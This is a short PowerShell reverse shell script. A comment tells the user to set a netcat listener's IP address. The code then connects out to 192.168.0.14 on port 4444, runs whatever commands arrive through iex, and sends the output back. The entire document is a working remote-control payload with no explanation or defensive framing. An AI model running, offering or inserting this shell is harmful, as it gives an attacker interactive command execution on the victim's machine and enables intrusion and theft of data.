<#


Change the IP Address 192.168.0.14 to your netcat listeners IP Address

#>
$client = New-Object System.Net.Sockets.TCPClient('192.168.0.14',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..255|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
$client.Close()